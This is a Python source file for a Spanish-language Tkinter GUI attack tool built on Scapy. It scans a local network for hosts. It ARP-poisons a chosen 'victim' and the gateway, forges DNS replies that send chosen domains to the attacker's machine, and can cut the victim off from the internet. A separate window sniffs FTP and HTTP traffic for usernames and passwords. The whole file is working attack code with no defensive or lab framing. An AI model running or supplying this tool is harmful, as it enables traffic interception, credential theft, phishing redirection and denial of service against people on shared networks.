import tkinter as tk
from tkinter import messagebox, scrolledtext, Toplevel
from scapy.all import ARP, Ether, srp, send, sniff, DNS, DNSRR, IP, UDP, conf, get_if_addr, TCP, Raw
import threading
import time
import netifaces
import sys
import io

# Variables globales
objetivo_ip = ""
gateway_ip = ""
atacante_ip = ""
mac_victima = ""
mac_gateway = ""
dominios_falsos = {}
hilo_arp = None
sniffing = True
hosts_encontrados = []
estado_bloqueo_label = None
estado_led_label = None

def obtener_ip_local():
    return get_if_addr(conf.iface)

def obtener_gateway():
    gws = netifaces.gateways()
    return gws['default'][netifaces.AF_INET][0]

def obtener_mac(ip):
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    result = srp(broadcast / arp_request, timeout=2, verbose=False)[0]
    return result[0][1].hwsrc if result else None

def arp_spoof():
    while sniffing:
        send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwdst=mac_victima), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=objetivo_ip, hwdst=mac_gateway), verbose=False)
        time.sleep(2)

def restaurar_arp():
    send(ARP(op=2, pdst=gateway_ip, psrc=objetivo_ip, hwsrc=mac_victima, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)
    send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwsrc=mac_gateway, hwdst="ff:ff:ff:ff:ff:ff"), count=5, verbose=False)

def dns_spoof(paquete):
    if paquete.haslayer(DNS) and paquete[DNS].qr == 0:
        dominio = paquete[DNS].qd.qname
        if dominio in dominios_falsos:
            imprimir_salida(f"[+] Interceptado: {paquete[IP].src} pidió {dominio.decode()}")
            respuesta = IP(dst=paquete[IP].src, src=paquete[IP].dst) / \
                        UDP(dport=paquete[UDP].sport, sport=53) / \
                        DNS(id=paquete[DNS].id, qr=1, aa=1, qd=paquete[DNS].qd,
                            an=DNSRR(rrname=dominio, ttl=5, rdata=dominios_falsos[dominio]))
            send(respuesta, verbose=False)
            imprimir_salida(f"[+] Redirigido a {dominios_falsos[dominio]}")

def iniciar_sniff():
    sniff(filter="udp port 53", prn=dns_spoof, store=0)

def iniciar_ataque():
    global objetivo_ip, gateway_ip, atacante_ip, mac_victima, mac_gateway, dominios_falsos, hilo_arp, sniffing

    objetivo_ip = entrada_ip.get().strip()
    dominios_input = entrada_dominios.get().strip()

    if not objetivo_ip or not dominios_input:
        messagebox.showerror("Error", "Por favor, introduce IP de la víctima y dominios.")
        return

    atacante_ip = obtener_ip_local()
    gateway_ip = obtener_gateway()
    mac_victima = obtener_mac(objetivo_ip)
    mac_gateway = obtener_mac(gateway_ip)

    if not mac_victima or not mac_gateway:
        messagebox.showerror("Error", "No se pudieron obtener las MACs.")
        return

    dominios_falsos = {}
    for dominio in dominios_input.split(","):
        dominio = dominio.strip()
        if dominio and not dominio.endswith("."):
            dominio += "."
        dominios_falsos[dominio.encode()] = atacante_ip

    sniffing = True
    hilo_arp = threading.Thread(target=arp_spoof, daemon=True)
    hilo_arp.start()
    threading.Thread(target=iniciar_sniff, daemon=True).start()

    imprimir_salida(f"[+] Ataque iniciado\nAtacante: {atacante_ip}\nGateway: {gateway_ip}")
    estado_bloqueo_label.config(text="")
    estado_led_label.config(text="🟢 Spoofing activo", fg="green")

def detener_ataque():
    global sniffing
    sniffing = False
    restaurar_arp()
    imprimir_salida("[*] Ataque detenido y ARP restaurado.")
    estado_bloqueo_label.config(text="", bg="#1e1e1e")
    estado_led_label.config(text="🔴 Detenido", fg="red")

def dejar_sin_internet():
    global objetivo_ip, gateway_ip, atacante_ip, mac_victima, mac_gateway, hilo_arp, sniffing

    objetivo_ip = entrada_ip.get().strip()
    if not objetivo_ip:
        messagebox.showerror("Error", "Introduce la IP de la víctima.")
        return

    atacante_ip = obtener_ip_local()
    gateway_ip = obtener_gateway()
    mac_victima = obtener_mac(objetivo_ip)
    mac_gateway = obtener_mac(gateway_ip)

    if not mac_victima or not mac_gateway:
        messagebox.showerror("Error", "No se pudieron obtener las MACs.")
        return

    def spoof_bloqueo():
        while sniffing:
            send(ARP(op=2, pdst=objetivo_ip, psrc=gateway_ip, hwdst=mac_victima), verbose=False)
            time.sleep(2)

    sniffing = True
    hilo_arp = threading.Thread(target=spoof_bloqueo, daemon=True)
    hilo_arp.start()

    imprimir_salida(f"[!] Internet bloqueado para la víctima: {objetivo_ip}")
    estado_bloqueo_label.config(text="Víctima sin Internet", bg="red")
    estado_led_label.config(text="🔴 Sin Internet", fg="red")

def imprimir_salida(texto):
    salida_text.config(state='normal')
    salida_text.insert(tk.END, texto + '\n')
    salida_text.yview(tk.END)
    salida_text.config(state='disabled')

class RedirectText(io.StringIO):
    def write(self, s):
        if s.strip():
            imprimir_salida(s.strip())

def escanear_red():
    global hosts_encontrados
    hosts_encontrados.clear()
    lista_hosts.delete(0, tk.END)
    ip_base = ".".join(obtener_ip_local().split(".")[:-1]) + ".1/24"
    imprimir_salida(f"[~] Escaneando red {ip_base}...")
    estado_led_label.config(text="🟡 Escaneando", fg="orange")

    arp = ARP(pdst=ip_base)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, timeout=3, verbose=False)[0]

    if not result:
        imprimir_salida("[!] No se encontraron hosts.")
        estado_led_label.config(text="🔴 Detenido", fg="red")
        return

    imprimir_salida("[+] Hosts encontrados:")
    for sent, received in result:
        ip_mac = f"{received.psrc} - {received.hwsrc}"
        lista_hosts.insert(tk.END, ip_mac)
        hosts_encontrados.append((received.psrc, received.hwsrc))
        imprimir_salida(ip_mac)

    estado_led_label.config(text="🔴 Detenido", fg="red")

def seleccionar_host(event):
    seleccion = lista_hosts.curselection()
    if seleccion:
        ip_seleccionada = hosts_encontrados[seleccion[0]][0]
        entrada_ip.delete(0, tk.END)
        entrada_ip.insert(0, ip_seleccionada)
        imprimir_salida(f"[*] IP seleccionada como víctima: {ip_seleccionada}")

def abrir_interceptor_credenciales():
    ventana_sniff = Toplevel(ventana)
    ventana_sniff.title("Intercepción de Credenciales")
    ventana_sniff.geometry("700x400")
    ventana_sniff.config(bg="#1e1e1e")

    log = scrolledtext.ScrolledText(ventana_sniff, bg="#111", fg="#00ff88", font=("Consolas", 10))
    log.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

    def analizar_paquete(pkt):
        if pkt.haslayer(Raw):
            carga = pkt[Raw].load.decode(errors="ignore")
            if any(x in carga.lower() for x in ["user", "username", "login", "pass", "password"]):
                log.insert(tk.END, f"\n[!] Posible credencial capturada:\n{carga}\n")
                log.yview(tk.END)

    def iniciar_sniffer():
        sniff(filter="tcp port 21 or tcp port 80", prn=analizar_paquete, store=0)

    threading.Thread(target=iniciar_sniffer, daemon=True).start()

# === Interfaz Gráfica ===
ventana = tk.Tk()
ventana.title("DNS Spoofing con ARP")
ventana.geometry("800x670")
ventana.config(bg="#1e1e1e")

menu_bar = tk.Menu(ventana)
archivo_menu = tk.Menu(menu_bar, tearoff=0)
archivo_menu.add_command(label="Interceptar Credenciales", command=abrir_interceptor_credenciales)
archivo_menu.add_command(label="Guardar log")
archivo_menu.add_separator()
archivo_menu.add_command(label="Salir", command=ventana.quit)

ayuda_menu = tk.Menu(menu_bar, tearoff=0)
ayuda_menu.add_command(label="Acerca de", command=lambda: messagebox.showinfo("Acerca de", "Herramienta de ARP y DNS Spoofing\nDesarrollada en Python"))

menu_bar.add_cascade(label="Archivo", menu=archivo_menu)
menu_bar.add_cascade(label="Ayuda", menu=ayuda_menu)
ventana.config(menu=menu_bar)

estilo_label = {"bg": "#1e1e1e", "fg": "white", "font": ("Consolas", 11)}
estilo_entry = {"bg": "#2a2a2a", "fg": "#00ff88", "insertbackground": "#00ff88", "font": ("Consolas", 11)}
estilo_boton = {"bg": "#444", "fg": "#fff", "activebackground": "#555", "font": ("Consolas", 10), "width": 18}

frame_inputs = tk.Frame(ventana, bg="#1e1e1e")
frame_inputs.pack(pady=10)

entrada_ip = tk.Entry(frame_inputs, width=30, **estilo_entry)
entrada_ip.grid(row=0, column=1, padx=5)
tk.Label(frame_inputs, text="IP de la víctima:", **estilo_label).grid(row=0, column=0, padx=5, sticky="e")

entrada_dominios = tk.Entry(frame_inputs, width=50, **estilo_entry)
entrada_dominios.grid(row=2, column=0, columnspan=2, padx=5)
tk.Label(frame_inputs, text="Dominios a spoofear (separados por coma):", **estilo_label).grid(row=1, column=0, columnspan=2, pady=5)

frame_botones = tk.Frame(ventana, bg="#1e1e1e")
frame_botones.pack(pady=10)

tk.Button(frame_botones, text="Iniciar Spoofing", command=iniciar_ataque, **estilo_boton).grid(row=0, column=0, padx=5)
tk.Button(frame_botones, text="Detener", command=detener_ataque, **estilo_boton).grid(row=0, column=1, padx=5)
tk.Button(frame_botones, text="Escanear Red", command=escanear_red, **estilo_boton).grid(row=0, column=2, padx=5)
tk.Button(frame_botones, text="Dejar sin Internet", command=dejar_sin_internet, **estilo_boton).grid(row=0, column=3, padx=5)

estado_led_label = tk.Label(ventana, text="🔴 Detenido", bg="#1e1e1e", fg="red", font=("Consolas", 11))
estado_led_label.pack(pady=2)

estado_bloqueo_label = tk.Label(ventana, text="", bg="#1e1e1e", fg="white", font=("Consolas", 11))
estado_bloqueo_label.pack(pady=2)

frame_lista = tk.Frame(ventana, bg="#1e1e1e")
frame_lista.pack(pady=10)
tk.Label(frame_lista, text="Hosts encontrados:", **estilo_label).pack()

lista_hosts = tk.Listbox(frame_lista, height=6, width=60, bg="#2a2a2a", fg="#00ff88", font=("Consolas", 10), bd=2, relief="sunken")
lista_hosts.pack(pady=5)
lista_hosts.bind('<<ListboxSelect>>', seleccionar_host)

salida_text = scrolledtext.ScrolledText(ventana, height=15, state='disabled', bg="#111", fg="#00ff88", font=("Consolas", 10))
salida_text.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)

sys.stdout = RedirectText()
sys.stderr = RedirectText()

ventana.mainloop()
